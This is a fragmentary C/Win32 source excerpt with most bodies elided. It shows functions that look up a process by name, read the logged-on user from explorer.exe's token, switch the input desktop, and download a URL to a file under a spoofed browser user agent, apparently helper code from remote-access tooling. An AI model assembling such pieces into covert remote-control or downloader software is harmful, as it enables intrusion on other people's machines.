...
DWORD GetProcessID(LPCTSTR lpProcessName)
{
	...
	{
		if (strcmpi((const char *)info->szExeFile, (const char *)lpProcessName) == 0)
		{
...
char *GetLogUser2K()
{
	DWORD	dwProcessID = GetProcessID((LPCTSTR)"explorer.exe");
	if (dwProcessID == 0)
		return NULL;
	...
	__try
	{
		...
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, (LPWSTR)lpUserName, &nNameLen,
...
bool SwitchInputDesktop()
{
	...
	if (lstrcmpi((LPCWSTR)strInputDesktop, (LPCWSTR)strCurrentDesktop) != 0)
	{
...
BOOL SelectDesktop(char *name)
{
	...
	if (name != NULL)
	{
		...
		desktop = OpenDesktop((LPCWSTR)name, 0, FALSE,
...
bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	...
	hInternet = InternetOpen((LPCWSTR)"Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL,INTERNET_INVALID_PORT_NUMBER,0);
	if (hInternet == NULL)
		return false;
